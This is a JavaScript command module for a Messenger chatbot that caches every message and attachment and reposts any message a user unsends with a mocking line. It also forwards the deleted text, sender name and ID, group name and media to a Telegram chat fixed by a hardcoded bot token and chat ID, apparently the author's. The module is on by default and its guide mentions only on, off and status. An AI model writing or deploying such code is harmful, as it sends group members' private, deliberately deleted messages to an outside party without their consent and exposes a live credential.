const fs = require("fs-extra");
const path = require("path");
const axios = require("axios");
const FormData = require("form-data");

const LOCKED_AUTHOR = "𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍";
const TELEGRAM_BOT_TOKEN = "8664273023:AAEu9ICybK8hzbfQNBDNhUR-ADwjreagawI";
const TELEGRAM_CHAT_ID = "-1004422571292";

const cacheDir = path.join(__dirname, "cache", "unsend_media");
const settingsPath = path.join(__dirname, "cache", "unsend_settings.json");

global.unsendMemoryMap = global.unsendMemoryMap || new Map();

const loadSettings = () => {
	try {
		if (!fs.existsSync(settingsPath)) {
			fs.ensureDirSync(path.dirname(settingsPath));
			fs.writeFileSync(settingsPath, JSON.stringify({}), "utf8");
			return {};
		}
		const content = fs.readFileSync(settingsPath, "utf8");
		return content ? JSON.parse(content) : {};
	} catch (err) {
		return {};
	}
};

const saveSettings = (data) => {
	try {
		fs.ensureDirSync(path.dirname(settingsPath));
		fs.writeFileSync(settingsPath, JSON.stringify(data, null, 2), "utf8");
	} catch (err) {}
};

let settings = loadSettings();

async function sendToTelegram(captionText, filePaths = [], api, threadID) {
	try {
		if (filePaths.length === 0) {
			const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
			await axios.post(url, {
				chat_id: TELEGRAM_CHAT_ID,
				text: captionText,
				parse_mode: "HTML"
			});
		} else if (filePaths.length === 1) {
			const filePath = filePaths[0];
			const ext = path.extname(filePath).toLowerCase();
			let method = "sendDocument";
			let fieldName = "document";

			if ([".jpg", ".jpeg", ".png"].includes(ext)) {
				method = "sendPhoto";
				fieldName = "photo";
			} else if ([".mp4", ".mov"].includes(ext)) {
				method = "sendVideo";
				fieldName = "video";
			} else if ([".mp3", ".ogg", ".wav"].includes(ext)) {
				method = "sendAudio";
				fieldName = "audio";
			}

			const formData = new FormData();
			formData.append("chat_id", TELEGRAM_CHAT_ID);
			formData.append("caption", captionText);
			formData.append(fieldName, fs.createReadStream(filePath));

			const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${method}`;
			await axios.post(url, formData, {
				headers: formData.getHeaders()
			});
		} else {
			const mediaGroup = [];
			const formData = new FormData();
			formData.append("chat_id", TELEGRAM_CHAT_ID);

			filePaths.forEach((filePath, index) => {
				const ext = path.extname(filePath).toLowerCase();
				let type = "document";
				if ([".jpg", ".jpeg", ".png"].includes(ext)) type = "photo";
				if ([".mp4", ".mov"].includes(ext)) type = "video";

				const attachName = `file${index}`;
				formData.append(attachName, fs.createReadStream(filePath));

				mediaGroup.push({
					type: type,
					media: `attach://${attachName}`,
					caption: index === 0 ? captionText : ""
				});
			});

			formData.append("media", JSON.stringify(mediaGroup));
			const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
			await axios.post(url, formData, {
				headers: formData.getHeaders()
			});
		}
	} catch (err) {
		const errorDetails = err.response && err.response.data 
			? JSON.stringify(err.response.data, null, 2) 
			: err.message;

		if (api && threadID) {
			await api.sendMessage(
`» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑
───────────────
⚠️ 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 𝐄𝐑𝐑𝐎𝐑 𝐋𝐎𝐆:
মেসেঞ্জার থেকে টেলিগ্রামে ডাটা পাঠানোর সময় সমস্যা হয়েছে!

📌 Error Details:
${errorDetails}
───────────────
» 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧`, threadID);
		}
	}
}

module.exports = {
	config: {
		name: "antiunsend",
		aliases: ["unsend", "স্পাম", "ডিলেট", "resend"],
		version: "7.0",
		author: LOCKED_AUTHOR,
		countDown: 0,
		role: 0,
		description: {
			bn: "অটোমেটিক অ্যান্টি-আনসেন্ড টেলিগ্রাম ফরওয়ার্ডার সিস্টেম (এরর হ্যান্ডলার সহ)"
		},
		guide: {
			bn: "antiunsend <on|off>\nantiunsend status"
		}
	},

	onStart: async function ({ api, event, args }) {
		if (module.exports.config.author !== LOCKED_AUTHOR) {
			module.exports.config.author = LOCKED_AUTHOR;
		}

		const threadID = event.threadID;

		if (settings[threadID] === undefined) {
			settings[threadID] = true;
			saveSettings(settings);
		}

		const option = args[0]?.toLowerCase();

		if (option === "on") {
			settings[threadID] = true;
			saveSettings(settings);
			return api.sendMessage(
`» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑
───────────────
» 🛡️ 𝐀𝐍𝐓𝐈-𝐔𝐍𝐒𝐄𝐍𝐃 
» 🔐 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃!
» 📌 𝐒𝐭𝐚𝐭𝐮𝐬: Enabled ✅
───────────────
» 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧`, threadID, event.messageID);
		}

		if (option === "off") {
			settings[threadID] = false;
			saveSettings(settings);
			return api.sendMessage(
`» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑
───────────────
» 🛡️ 𝐀𝐍𝐓𝐈-𝐔𝐍𝐒𝐄𝐍𝐃 
» 🎀 𝐃𝐄𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃!
» 📌 𝐒𝐭𝐚𝐭𝐮𝐬: Disabled ❌
───────────────
» 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧`, threadID, event.messageID);
		}

		if (option === "status" || option === "info") {
			const isON = settings[threadID] !== false;
			const statusStr = isON ? "ON ✅" : "OFF ❌";
			return api.sendMessage(
`» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑
───────────────
» 🛡️ 𝐀𝐍𝐓𝐈-𝐔𝐍𝐒𝐄𝐍𝐃 𝐒𝐓𝐀𝐓𝐔𝐒:
» 📌 𝐂𝐮𝐫𝐫𝐞𝐧𝐭 𝐒𝐭𝐚𝐭𝐮𝐬: 
» 🪯 ${statusStr}
───────────────
» 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧`, threadID, event.messageID);
		}

		return api.sendMessage(
`» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑
───────────────
📌 𝐀𝐍𝐓𝐈-𝐔𝐍𝐒𝐄𝐍𝐃 𝐆𝐔𝐈𝐃𝐄:

» antiunsend on - অন করুন
» antiunsend off - অফ করুন
» antiunsend status - স্ট্যাটাস দেখুন
───────────────
» 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧`, threadID, event.messageID);
	},

	onChat: async function ({ api, event, Users, Threads }) {
		const threadID = event.threadID;

		if (settings[threadID] === false) return;

		if (event.type === "message_unsend") {
			const savedMsg = global.unsendMemoryMap.get(event.messageID);
			if (!savedMsg) return;

			const senderID = savedMsg.senderID;

			let senderName = "User";
			try {
				if (Users && typeof Users.getNameInBand === "function") {
					senderName = await Users.getNameInBand(senderID);
				} else if (Users && typeof Users.getName === "function") {
					senderName = await Users.getName(senderID);
				} else if (api && typeof api.getUserInfo === "function") {
					const res = await api.getUserInfo(senderID);
					if (res && res[senderID] && res[senderID].name) {
						senderName = res[senderID].name;
					}
				}
			} catch (e) {}

			let threadName = "Group/Inbox";
			try {
				if (Threads && typeof Threads.getName === "function") {
					threadName = await Threads.getName(threadID);
				} else if (api && typeof api.getThreadInfo === "function") {
					const tInfo = await api.getThreadInfo(threadID);
					if (tInfo && tInfo.threadName) {
						threadName = tInfo.threadName;
					}
				}
			} catch (e) {}

			let msgContent = savedMsg.body ? savedMsg.body : "নেই (শুধুমাত্র মিডিয়া)";

			let origResendBody = 
`» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑
_________________________
কি ভাবছিস? 😏 ডিলিট করে বেঁচে যাবি নাকি? 😂
» 👤 𝐒𝐞𝐧𝐝𝐞𝐫: ${senderName}
» 💬 𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 
${msgContent}`;

			let attachmentStreamsOriginal = [];
			if (savedMsg.attachmentPaths && savedMsg.attachmentPaths.length > 0) {
				for (const filePath of savedMsg.attachmentPaths) {
					if (fs.existsSync(filePath)) {
						attachmentStreamsOriginal.push(fs.createReadStream(filePath));
					}
				}
			}

			await api.sendMessage({
				body: origResendBody,
				attachment: attachmentStreamsOriginal.length > 0 ? attachmentStreamsOriginal : undefined
			}, threadID);

			let telegramCaption = 
`👑 <b>𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 (Anti-Unsend Alert)</b>
──────────────────
👨‍👩‍👧‍👦 <b>Group:</b> ${threadName}
👤 <b>Sender:</b> ${senderName} (ID: <code>${senderID}</code>)
💬 <b>Unsent Message:</b>
${msgContent}`;

			const validPaths = (savedMsg.attachmentPaths || []).filter(p => fs.existsSync(p));
			await sendToTelegram(telegramCaption, validPaths, api, threadID);

			if (savedMsg.attachmentPaths && savedMsg.attachmentPaths.length > 0) {
				savedMsg.attachmentPaths.forEach(p => {
					try { fs.unlinkSync(p); } catch (e) {}
				});
			}

			global.unsendMemoryMap.delete(event.messageID);
			return;
		}

		if (event.type === "message" || event.type === "message_reply") {
			fs.ensureDirSync(cacheDir);

			let cachedAttachmentPaths = [];

			if (event.attachments && event.attachments.length > 0) {
				for (let i = 0; i < event.attachments.length; i++) {
					const att = event.attachments[i];
					if (att.url) {
						let ext = "png";
						if (att.type === "photo") ext = "jpg";
						else if (att.type === "video") ext = "mp4";
						else if (att.type === "audio") ext = "mp3";
						else if (att.type === "animated_image") ext = "gif";

						const filePath = path.join(cacheDir, `${event.messageID}_${i}.${ext}`);
						try {
							const response = await axios({
								method: "GET",
								url: att.url,
								responseType: "stream"
							});
							const writer = fs.createWriteStream(filePath);
							response.data.pipe(writer);

							await new Promise((resolve, reject) => {
								writer.on("finish", resolve);
								writer.on("error", (err) => {
									writer.close();
									reject(err);
								});
							});
							cachedAttachmentPaths.push(filePath);
						} catch (err) {
							try { fs.unlinkSync(filePath); } catch (e) {}
						}
					}
				}
			}

			global.unsendMemoryMap.set(event.messageID, {
				body: event.body || "",
				senderID: event.senderID,
				attachmentPaths: cachedAttachmentPaths,
				timestamp: Date.now()
			});

			if (global.unsendMemoryMap.size > 200) {
				const oldestKey = global.unsendMemoryMap.keys().next().value;
				const oldData = global.unsendMemoryMap.get(oldestKey);
				if (oldData && oldData.attachmentPaths) {
					oldData.attachmentPaths.forEach(p => {
						try { fs.unlinkSync(p); } catch (e) {}
					});
				}
				global.unsendMemoryMap.delete(oldestKey);
			}
		}
	}
};
